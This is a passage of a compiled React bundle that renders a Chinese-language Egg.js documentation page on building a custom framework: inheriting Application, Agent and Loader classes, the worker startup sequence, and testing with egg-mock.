6\u548c\u5e73\u53f0\u7684\u53cc\u5411\u63a7\u5236\uff0c\u5e94\u7528\u53ea\u9700\u8981\u5173\u6ce8\u81ea\u5df1\u7684\u4ee3\u7801\uff0c\u5177\u4f53\u67e5\u770b",r.a.createElement(l["Link"],{to:"../core/deployment"},"\u5e94\u7528\u90e8\u7f72")),r.a.createElement("li",null,"\u7edf\u4e00\u7684\u4ee3\u7801\u98ce\u683c\uff0c\u6846\u67b6\u4e0d\u4ec5\u4ec5\u89e3\u51b3\u4ee3\u7801\u91cd\u7528\u95ee\u9898\uff0c\u8fd8\u53ef\u4ee5\u5bf9\u5e94\u7528\u505a\u4e00\u5b9a\u7ea6\u675f\uff0c\u4f5c\u4e3a\u4f01\u4e1a\u6846\u67b6\u662f\u5f88\u5fc5\u8981\u7684\u3002Egg \u5728 Koa \u57fa\u7840\u4e0a\u505a\u4e86\u5f88\u591a\u7ea6\u5b9a\uff0c\u6846\u67b6\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"./loader"},"Loader")," \u81ea\u5df1\u5b9a\u4e49\u4ee3\u7801\u89c4\u5219\u3002")),r.a.createElement("p",null,"\u4e3a\u6b64\uff0cEgg \u4e3a\u56e2\u961f\u67b6\u6784\u5e08\u548c\u6280\u672f\u8d1f\u8d23\u4eba\u63d0\u4f9b ",r.a.createElement("code",null,"\u6846\u67b6\u5b9a\u5236")," \u7684\u80fd\u529b\uff0c\u6846\u67b6\u662f\u4e00\u5c42\u62bd\u8c61\uff0c\u53ef\u4ee5\u57fa\u4e8e Egg \u53bb\u5c01\u88c5\u4e0a\u5c42\u6846\u67b6\uff0c\u5e76\u4e14 Egg \u652f\u6301\u591a\u5c42\u7ee7\u627f\u3002"),r.a.createElement("p",null,"\u8fd9\u6837\uff0c\u6574\u4e2a\u56e2\u961f\u5c31\u53ef\u4ee5\u9075\u5faa\u7edf\u4e00\u7684\u65b9\u6848\uff0c\u5e76\u4e14\u5728\u9879\u76ee\u4e2d\u53ef\u4ee5\u6839\u636e\u4e1a\u52a1\u573a\u666f\u81ea\u884c\u4f7f\u7528\u63d2\u4ef6\u505a\u5dee\u5f02\u5316\uff0c\u5f53\u540e\u8005\u9a8c\u8bc1\u4e3a\u6700\u4f73\u5b9e\u8df5\u540e\uff0c\u5c31\u80fd\u4e0b\u6c89\u5230\u6846\u67b6\u4e2d\uff0c\u5176\u4ed6\u9879\u76ee\u4ec5\u9700\u7b80\u5355\u7684\u5347\u7ea7\u4e0b\u6846\u67b6\u7684\u7248\u672c\u5373\u53ef\u4eab\u53d7\u5230\u3002"),r.a.createElement("p",null,"\u5177\u4f53\u53ef\u4ee5\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1"),"\u3002"),r.a.createElement("h2",{id:"\u6846\u67b6\u4e0e\u591a\u8fdb\u7a0b"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u4e0e\u591a\u8fdb\u7a0b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u4e0e\u591a\u8fdb\u7a0b"),r.a.createElement("p",null,"\u6846\u67b6\u7684\u6269\u5c55\u662f\u548c\u591a\u8fdb\u7a0b\u6a21\u578b\u6709\u5173\u7684\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b"),"\uff0c\u4e5f\u77e5\u9053 Agent Worker \u548c App Worker \u7684\u533a\u522b\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6269\u5c55\u7684\u7c7b\u4e5f\u6709\u4e24\u4e2a Agent \u548c Application\uff0c\u800c\u8fd9\u4e24\u4e2a\u7c7b\u7684 API \u4e0d\u4e00\u5b9a\u76f8\u540c\u3002"),r.a.createElement("p",null,"\u5728 Agent Worker \u542f\u52a8\u7684\u65f6\u5019\u4f1a\u5b9e\u4f8b\u5316 Agent\uff0c\u800c\u5728 App Worker \u542f\u52a8\u65f6\u4f1a\u5b9e\u4f8b\u5316 Application\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u53c8\u540c\u65f6\u7ee7\u627f ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core"},"EggCore"),"\u3002"),r.a.createElement("p",null,"EggCore \u53ef\u4ee5\u770b\u505a Koa Application \u7684\u5347\u7ea7\u7248\uff0c\u9ed8\u8ba4\u5185\u7f6e ",r.a.createElement(l["Link"],{to:"./loader"},"Loader"),"\u3001",r.a.createElement(l["Link"],{to:"../basics/router"},"Router")," \u53ca\u5e94\u7528\u5f02\u6b65\u542f\u52a8\u7b49\u529f\u80fd\uff0c\u53ef\u4ee5\u770b\u505a\u662f\u652f\u6301 Loader \u7684 Koa\u3002"),r.a.createElement(o["a"],{code:"Koa Application\n              ^\n           EggCore\n              ^\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502              \u2502\n   Egg Agent      Egg Application\n      ^               ^\n agent worker     app worker",lang:"unknown"}),r.a.createElement("h2",{id:"\u5982\u4f55\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6"),r.a.createElement("p",null,"\u4f60\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-boilerplate-framework"},"egg-boilerplate-framework")," \u811a\u624b\u67b6\u6765\u5feb\u901f\u4e0a\u624b\u3002"),r.a.createElement(o["a"],{code:"$ mkdir yadan && cd yadan\n$ npm init egg --type=framework\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("p",null,"\u4f46\u540c\u6837\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u4e86\u89e3\u7ec6\u8282\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u8fd8\u662f\u624b\u628a\u624b\u6765\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6\uff0c\u5177\u4f53\u4ee3\u7801\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/framework"},"\u793a\u4f8b")),r.a.createElement("h3",{id:"\u6846\u67b6-api"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6-api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6 API"),r.a.createElement("p",null,"Egg \u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e9b API\uff0c\u6240\u6709\u7ee7\u627f\u7684\u6846\u67b6\u90fd\u9700\u8981\u63d0\u4f9b\uff0c\u53ea\u589e\u4e0d\u51cf\u3002\u8fd9\u4e9b API \u57fa\u672c\u90fd\u6709 Agent \u548c Application \u4e24\u4efd\u3002"),r.a.createElement("h4",{id:"eggstartcluster"},r.a.createElement(l["AnchorLink"],{to:"#eggstartcluster","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.startCluster")),r.a.createElement("p",null,"Egg \u7684\u591a\u8fdb\u7a0b\u542f\u52a8\u5668\uff0c\u7531\u8fd9\u4e2a\u65b9\u6cd5\u6765\u542f\u52a8 Master\uff0c\u4e3b\u8981\u7684\u529f\u80fd\u5b9e\u73b0\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," \u4e0a\u3002\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 EggCore \u8fd8\u662f\u5355\u8fdb\u7a0b\u7684\u65b9\u5f0f\uff0c\u800c Egg \u5b9e\u73b0\u4e86\u591a\u8fdb\u7a0b\u3002"),r.a.createElement(o["a"],{code:"const startCluster = require('egg').startCluster;\nstartCluster(\n  {\n    // \u5e94\u7528\u7684\u4ee3\u7801\u76ee\u5f55\n    baseDir: '/path/to/app',\n    // \u9700\u8981\u901a\u8fc7\u8fd9\u4e2a\u53c2\u6570\u6765\u6307\u5b9a\u6846\u67b6\u76ee\u5f55\n    framework: '/path/to/framework',\n  },\n  () => {\n    console.log('app started');\n  },\n);",lang:"js"}),r.a.createElement("p",null,"\u6240\u6709\u53c2\u6570\u53ef\u4ee5\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster#options"},"egg-cluster")),r.a.createElement("h4",{id:"eggapplication-\u548c-eggagent"},r.a.createElement(l["AnchorLink"],{to:"#eggapplication-\u548c-eggagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.Application")," \u548c ",r.a.createElement("code",null,"egg.Agent")),r.a.createElement("p",null,"\u8fdb\u7a0b\u4e2d\u7684\u552f\u4e00\u5355\u4f8b\uff0c\u4f46 Application \u548c Agent \u5b58\u5728\u4e00\u5b9a\u5dee\u5f02\u3002\u5982\u679c\u6846\u67b6\u7ee7\u627f\u4e8e Egg\uff0c\u4f1a\u5b9a\u5236\u8fd9\u4e24\u4e2a\u7c7b\uff0c\u90a3 framework \u5e94\u8be5 export \u8fd9\u4e24\u4e2a\u7c7b\u3002"),r.a.createElement("h4",{id:"eggappworkerloader-\u548c-eggagentworkerloader"},r.a.createElement(l["AnchorLink"],{to:"#eggappworkerloader-\u548c-eggagentworkerloader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.AppWorkerLoader")," \u548c ",r.a.createElement("code",null,"egg.AgentWorkerLoader")),r.a.createElement("p",null,"\u6846\u67b6\u4e5f\u5b58\u5728\u5b9a\u5236 Loader \u7684\u573a\u666f\uff0c\u8986\u76d6\u539f\u65b9\u6cd5\u6216\u8005\u65b0\u52a0\u8f7d\u76ee\u5f55\u90fd\u9700\u8981\u63d0\u4f9b\u81ea\u5df1\u7684 Loader\uff0c\u800c\u4e14\u5fc5\u987b\u8981\u7ee7\u627f Egg \u7684 Loader\u3002"),r.a.createElement("h3",{id:"\u6846\u67b6\u7ee7\u627f"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u7ee7\u627f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u7ee7\u627f"),r.a.createElement("p",null,"\u6846\u67b6\u652f\u6301\u7ee7\u627f\u5173\u7cfb\uff0c\u53ef\u4ee5\u628a\u6846\u67b6\u6bd4\u4f5c\u4e00\u4e2a\u7c7b\uff0c\u90a3\u4e48\u57fa\u7c7b\u5c31\u662f Egg \u6846\u67b6\uff0c\u5982\u679c\u60f3\u5bf9 Egg \u505a\u6269\u5c55\u5c31\u7ee7\u627f\u3002"),r.a.createElement("p",null,"\u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6846\u67b6\u9700\u8981\u5b9e\u73b0 Egg \u6240\u6709\u7684 API"),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "yadan",\n  "dependencies": {\n    "egg": "^2.0.0"\n  }\n}\n\n// index.js\nmodule.exports = require(\'./lib/framework.js\');\n\n// lib/framework.js\nconst path = require(\'path\');\nconst egg = require(\'egg\');\nconst EGG_PATH = Symbol.for(\'egg#eggPath\');\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // \u8fd4\u56de framework \u8def\u5f84\n    return path.dirname(__dirname);\n  }\n}\n\n// \u8986\u76d6\u4e86 Egg \u7684 Application\nmodule.exports = Object.assign(egg, {\n  Application,\n});',lang:"js"}),r.a.createElement("p",null,"\u5e94\u7528\u542f\u52a8\u65f6\u9700\u8981\u6307\u5b9a\u6846\u67b6\u540d\uff08\u5728 ",r.a.createElement("code",null,"package.json")," \u6307\u5b9a ",r.a.createElement("code",null,"egg.framework"),"\uff0c\u9ed8\u8ba4\u4e3a egg\uff09\uff0cLoader \u5c06\u4ece ",r.a.createElement("code",null,"node_modules")," \u627e\u6307\u5b9a\u6a21\u5757\u4f5c\u4e3a\u6846\u67b6\uff0c\u5e76\u52a0\u8f7d\u5176 export \u7684 Application\u3002"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev"\n  },\n  "egg": {\n    "framework": "yadan"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u73b0\u5728 yadan \u6846\u67b6\u76ee\u5f55\u5df2\u7ecf\u662f\u4e00\u4e2a loadUnit\uff0c\u90a3\u4e48\u76f8\u5e94\u76ee\u5f55\u548c\u6587\u4ef6\uff08\u5982 ",r.a.createElement("code",null,"app")," \u548c ",r.a.createElement("code",null,"config"),"\uff09\u90fd\u4f1a\u88ab\u52a0\u8f7d\uff0c\u67e5\u770b",r.a.createElement(l["Link"],{to:"./loader"},"\u6846\u67b6\u88ab\u52a0\u8f7d\u7684\u6587\u4ef6"),"\u3002"),r.a.createElement("h3",{id:"\u6846\u67b6\u7ee7\u627f\u539f\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u7ee7\u627f\u539f\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u7ee7\u627f\u539f\u7406"),r.a.createElement("p",null,"\u4f7f\u7528 ",r.a.createElement("code",null,"Symbol.for('egg#eggPath')")," \u6765\u6307\u5b9a\u5f53\u524d\u6846\u67b6\u7684\u8def\u5f84\uff0c\u76ee\u7684\u662f\u8ba9 Loader \u80fd\u63a2\u6d4b\u5230\u6846\u67b6\u7684\u8def\u5f84\u3002\u4e3a\u4ec0\u4e48\u8fd9\u6837\u5b9e\u73b0\u5462\uff1f\u5176\u5b9e\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u5c06\u6846\u67b6\u7684\u8def\u5f84\u4f20\u9012\u7ed9 Loader\uff0c\u4f46\u6211\u4eec\u9700\u8981\u5b9e\u73b0\u591a\u7ea7\u6846\u67b6\u7ee7\u627f\uff0c\u6bcf\u4e00\u5c42\u6846\u67b6\u90fd\u8981\u63d0\u4f9b\u81ea\u5df1\u7684\u5f53\u524d\u8def\u5f84\uff0c\u5e76\u4e14\u9700\u8981\u7ee7\u627f\u5b58\u5728\u5148\u540e\u987a\u5e8f\u3002"),r.a.createElement("p",null,"\u73b0\u5728\u7684\u5b9e\u73b0\u65b9\u6848\u662f\u57fa\u4e8e\u7c7b\u7ee7\u627f\u7684\uff0c\u6bcf\u4e00\u5c42\u6846\u67b6\u90fd\u5fc5\u987b\u7ee7\u627f\u4e0a\u4e00\u5c42\u6846\u67b6\u5e76\u4e14\u6307\u5b9a eggPath\uff0c\u7136\u540e\u904d\u5386\u539f\u578b\u94fe\u5c31\u80fd\u83b7\u53d6\u6bcf\u4e00\u5c42\u7684\u6846\u67b6\u8def\u5f84\u4e86\u3002"),r.a.createElement("p",null,"\u6bd4\u5982\u6709\u4e09\u5c42\u6846\u67b6\uff1a\u90e8\u95e8\u6846\u67b6\uff08department\uff09> \u4f01\u4e1a\u6846\u67b6\uff08enterprise\uff09> Egg"),r.a.createElement(o["a"],{code:"// enterprise\nconst Application = require('egg').Application;\nclass Enterprise extends Application {\n  get [EGG_PATH]() {\n    return '/path/to/enterprise';\n  }\n}\n// \u81ea\u5b9a\u4e49\u6a21\u5757 Application\nexports.Application = Enterprise;\n\n// department\nconst Application = require('enterprise').Application;\n// \u7ee7\u627f enterprise \u7684 Application\nclass department extends Application {\n  get [EGG_PATH]() {\n    return '/path/to/department';\n  }\n}\n\n// \u542f\u52a8\u9700\u8981\u4f20\u5165 department \u7684\u6846\u67b6\u8def\u5f84\u624d\u80fd\u83b7\u53d6 Application\nconst Application = require('department').Application;\nconst app = new Application();\napp.ready();",lang:"js"}),r.a.createElement("p",null,"\u4ee5\u4e0a\u5747\u662f\u4f2a\u4ee3\u7801\uff0c\u4e3a\u4e86\u8be6\u7ec6\u8bf4\u660e\u6846\u67b6\u8def\u5f84\u7684\u52a0\u8f7d\u8fc7\u7a0b\uff0c\u4e0d\u8fc7 Egg \u5df2\u7ecf\u5728",r.a.createElement(l["Link"],{to:"../core/development"},"\u672c\u5730\u5f00\u53d1"),"\u548c",r.a.createElement(l["Link"],{to:"../core/deployment"},"\u5e94\u7528\u90e8\u7f72"),"\u63d0\u4f9b\u4e86\u5f88\u597d\u7684\u5de5\u5177\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u3002"),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49-agent"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49-agent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49 Agent"),r.a.createElement("p",null,"\u4e0a\u9762\u7684\u4f8b\u5b50\u81ea\u5b9a\u4e49\u4e86 Application\uff0c\u56e0\u4e3a Egg \u662f\u591a\u8fdb\u7a0b\u6a21\u578b\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5b9a\u4e49 Agent\uff0c\u539f\u7406\u662f\u4e00\u6837\u7684\u3002"),r.a.createElement(o["a"],{code:"// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // \u8fd4\u56de framework \u8def\u5f84\n    return path.dirname(__dirname);\n  }\n}\n\nclass Agent extends egg.Agent {\n  get [EGG_PATH]() {\n    return path.dirname(__dirname);\n  }\n}\n\n// \u8986\u76d6\u4e86 Egg \u7684 Application\nmodule.exports = Object.assign(egg, {\n  Application,\n  Agent,\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4f46\u56e0\u4e3a Agent \u548c Application \u662f\u4e24\u4e2a\u5b9e\u4f8b\uff0c\u6240\u4ee5 API \u6709\u53ef\u80fd\u4e0d\u4e00\u81f4\u3002")),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49-loader"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49-loader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49 Loader"),r.a.createElement("p",null,"Loader \u5e94\u7528\u542f\u52a8\u7684\u6838\u5fc3\uff0c\u4f7f\u7528\u5b83\u8fd8\u80fd\u89c4\u8303\u5e94\u7528\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u7c7b\u6269\u5c55\u66f4\u591a\u529f\u80fd\uff0c\u6bd4\u5982\u52a0\u8f7d\u6570\u636e\u4ee3\u7801\u3002\u6269\u5c55 Loader \u8fd8\u80fd\u8986\u76d6\u9ed8\u8ba4\u7684\u5b9e\u73b0\uff0c\u6216\u8c03\u6574\u73b0\u6709\u7684\u52a0\u8f7d\u987a\u5e8f\u7b49\u3002"),r.a.createElement("p",null,"\u81ea\u5b9a\u4e49 Loader \u4e5f\u662f\u7528 ",r.a.createElement("code",null,"Symbol.for('egg#loader')")," \u7684\u65b9\u5f0f\uff0c\u4e3b\u8981\u7684\u539f\u56e0\u8fd8\u662f\u4f7f\u7528\u539f\u578b\u94fe\uff0c\u4e0a\u5c42\u6846\u67b6\u53ef\u8986\u76d6\u5e95\u5c42 Loader\uff0c\u5728\u4e0a\u9762\u4f8b\u5b50\u7684\u57fa\u7840\u4e0a"),r.a.createElement(o["a"],{code:"// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass YadanAppWorkerLoader extends egg.AppWorkerLoader {\n  load() {\n    super.load();\n    // \u81ea\u5df1\u6269\u5c55\n  }\n}\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // \u8fd4\u56de framework \u8def\u5f84\n    return path.dirname(__dirname);\n  }\n  // \u8986\u76d6 Egg \u7684 Loader\uff0c\u542f\u52a8\u65f6\u4f7f\u7528\u8fd9\u4e2a Loader\n  get [EGG_LOADER]() {\n    return YadanAppWorkerLoader;\n  }\n}\n\n// \u8986\u76d6\u4e86 Egg \u7684 Application\nmodule.exports = Object.assign(egg, {\n  Application,\n  // \u81ea\u5b9a\u4e49\u7684 Loader \u4e5f\u9700\u8981 export\uff0c\u4e0a\u5c42\u6846\u67b6\u9700\u8981\u57fa\u4e8e\u8fd9\u4e2a\u6269\u5c55\n  AppWorkerLoader: YadanAppWorkerLoader,\n});",lang:"js"}),r.a.createElement("p",null,"AgentWorkerLoader \u6269\u5c55\u4e5f\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u4e0d\u518d\u4e3e\u4f8b\u3002AgentWorkerLoader \u52a0\u8f7d\u7684\u6587\u4ef6\u53ef\u4ee5\u4e8e AppWorkerLoader \u4e0d\u540c\uff0c\u6bd4\u5982\uff1a\u9ed8\u8ba4\u52a0\u8f7d\u65f6\uff0cEgg \u7684 AppWorkerLoader \u4f1a\u52a0\u8f7d ",r.a.createElement("code",null,"app.js")," \u800c AgentWorkerLoader \u52a0\u8f7d\u7684\u662f ",r.a.createElement("code",null,"agent.js"),"\u3002"),r.a.createElement("h2",{id:"\u6846\u67b6\u542f\u52a8\u539f\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u542f\u52a8\u539f\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u542f\u52a8\u539f\u7406"),r.a.createElement("p",null,"\u6846\u67b6\u542f\u52a8\u5728",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b"),"\u3001",r.a.createElement(l["Link"],{to:"./loader"},"Loader"),"\u3001",r.a.createElement(l["Link"],{to:"./plugin"},"\u63d2\u4ef6"),"\u4e2d\u6216\u591a\u6216\u5c11\u90fd\u63d0\u8fc7\uff0c\u8fd9\u91cc\u7cfb\u7edf\u7684\u68b3\u7406\u4e0b\u542f\u52a8\u987a\u5e8f\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"startCluster \u542f\u52a8\u4f20\u5165 ",r.a.createElement("code",null,"baseDir")," \u548c ",r.a.createElement("code",null,"framework"),"\uff0cMaster \u8fdb\u7a0b\u542f\u52a8"),r.a.createElement("li",null,"Master \u5148 fork Agent Worker",r.a.createElement("ul",null,r.a.createElement("li",null,"\u6839\u636e framework \u627e\u5230\u6846\u67b6\u76ee\u5f55\uff0c\u5b9e\u4f8b\u5316\u8be5\u6846\u67b6\u7684 Agent \u7c7b"),r.a.createElement("li",null,"Agent \u627e\u5230\u5b9a\u4e49\u7684 AgentWorkerLoader\uff0c\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d"),r.a.createElement("li",null,"AgentWorkerLoader\uff0c\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d \u6574\u4e2a\u52a0\u8f7d\u8fc7\u7a0b\u662f\u540c\u6b65\u7684\uff0c\u6309 plugin > config > extend > ",r.a.createElement("code",null,"agent.js")," > \u5176\u4ed6\u6587\u4ef6\u987a\u5e8f\u52a0\u8f7d"),r.a.createElement("li",null,r.a.createElement("code",null,"agent.js")," \u53ef\u81ea\u5b9a\u4e49\u521d\u59cb\u5316\uff0c\u652f\u6301\u5f02\u6b65\u542f\u52a8\uff0c\u5982\u679c\u5b9a\u4e49\u4e86 beforeStart \u4f1a\u7b49\u5f85\u6267\u884c\u5b8c\u6210\u4e4b\u540e\u901a\u77e5 Master \u542f\u52a8\u5b8c\u6210\u3002"))),r.a.createElement("li",null,"Master \u5f97\u5230 Agent Worker \u542f\u52a8\u6210\u529f\u7684\u6d88\u606f\uff0c\u4f7f\u7528 cluster fork App Worker",r.a.createElement("ul",null,r.a.createElement("li",null,"App Worker \u6709\u591a\u4e2a\u8fdb\u7a0b\uff0c\u6240\u4ee5\u8fd9\u51e0\u4e2a\u8fdb\u7a0b\u662f\u5e76\u884c\u542f\u52a8\u7684\uff0c\u4f46\u6267\u884c\u903b\u8f91\u662f\u4e00\u81f4\u7684"),r.a.createElement("li",null,"\u5355\u4e2a App Worker \u548c Agent \u7c7b\u4f3c\uff0c\u901a\u8fc7 framework \u627e\u5230\u6846\u67b6\u76ee\u5f55\uff0c\u5b9e\u4f8b\u5316\u8be5\u6846\u67b6\u7684 Application \u7c7b"),r.a.createElement("li",null,"Application \u627e\u5230 AppWorkerLoader\uff0c\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\uff0c\u987a\u5e8f\u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c\u4f1a\u5f02\u6b65\u7b49\u5f85\uff0c\u5b8c\u6210\u540e\u901a\u77e5 Master \u542f\u52a8\u5b8c\u6210"))),r.a.createElement("li",null,"Master \u7b49\u5f85\u591a\u4e2a App Worker \u7684\u6210\u529f\u6d88\u606f\u540e\u542f\u52a8\u5b8c\u6210\uff0c\u80fd\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002")),r.a.createElement("h2",{id:"\u6846\u67b6\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u6d4b\u8bd5"),r.a.createElement("p",null,"\u5728\u770b\u4e0b\u6587\u4e4b\u524d\u8bf7\u5148\u67e5\u770b",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5\u7ae0\u8282"),"\uff0c\u6846\u67b6\u6d4b\u8bd5\u7684\u5927\u90e8\u5206\u4f7f\u7528\u573a\u666f\u548c\u5e94\u7528\u7c7b\u4f3c\u3002"),r.a.createElement("h3",{id:"\u521d\u59cb\u5316"},r.a.createElement(l["AnchorLink"],{to:"#\u521d\u59cb\u5316","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521d\u59cb\u5316"),r.a.createElement("p",null,"\u6846\u67b6\u7684\u521d\u59cb\u5316\u65b9\u5f0f\u6709\u4e00\u5b9a\u5dee\u5f02"),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.app({\n      // \u8f6c\u6362\u6210 test/fixtures/apps/example\n      baseDir: 'apps/example',\n      // \u91cd\u8981\uff1a\u914d\u7f6e framework\n      framework: true,\n    });\n    return app.ready();\n  });\n\n  after(() => app.close());\n  afterEach(mock.restore);\n\n  it('should success', () => {\n    return app.httpRequest().get('/').expect(200);\n  });\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6846\u67b6\u548c\u5e94\u7528\u4e0d\u540c\uff0c\u5e94\u7528\u6d4b\u8bd5\u5f53\u524d\u4ee3\u7801\uff0c\u800c\u6846\u67b6\u662f\u6d4b\u8bd5\u6846\u67b6\u4ee3\u7801\uff0c\u6240\u4ee5\u4f1a\u9891\u7e41\u66f4\u6362 baseDir \u8fbe\u5230\u6d4b\u8bd5\u5404\u79cd\u5e94\u7528\u7684\u76ee\u7684\u3002"),r.a.createElement("li",null,"baseDir \u6709\u6f5c\u89c4\u5219\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u628a\u6d4b\u8bd5\u7684\u5e94\u7528\u4ee3\u7801\u653e\u5230 ",r.a.createElement("code",null,"test/fixtures")," \u4e0b\uff0c\u6240\u4ee5\u81ea\u52a8\u8865\u5168\uff0c\u4e5f\u53ef\u4ee5\u4f20\u5165\u7edd\u5bf9\u8def\u5f84\u3002"),r.a.createElement("li",null,"\u5fc5\u987b\u6307\u5b9a ",r.a.createElement("code",null,"framework: true"),"\uff0c\u544a\u77e5\u5f53\u524d\u8def\u5f84\u4e3a\u6846\u67b6\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u4f20\u5165\u7edd\u5bf9\u8def\u5f84\u3002"),r.a.createElement("li",null,"app \u5e94\u7528\u9700\u8981\u5728 before \u7b49\u5f85 ready\uff0c\u4e0d\u7136\u5728 testcase \u91cc\u65e0\u6cd5\u83b7\u53d6\u90e8\u5206 API"),r.a.createElement("li",null,"\u6846\u67b6\u5728\u6d4b\u8bd5\u5b8c\u6bd5\u540e\u9700\u8981\u4f7f\u7528 ",r.a.createElement("code",null,"app.close()")," \u5173\u95ed\uff0c\u4e0d\u7136\u4f1a\u6709\u9057\u7559\u95ee\u9898\uff0c\u6bd4\u5982\u65e5\u5fd7\u5199\u6587\u4ef6\u672a\u5173\u95ed\u5bfc\u81f4 fd \u4e0d\u591f\u3002")),r.a.createElement("h3",{id:"\u7f13\u5b58"},r.a.createElement(l["AnchorLink"],{to:"#\u7f13\u5b58","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f13\u5b58"),r.a.createElement("p",null,"\u5728\u6d4b\u8bd5\u591a\u73af\u5883\u573a\u666f\u9700\u8981\u4f7f\u7528\u5230 cache \u53c2\u6570\uff0c\u56e0\u4e3a ",r.a.createElement("code",null,"mm.app")," 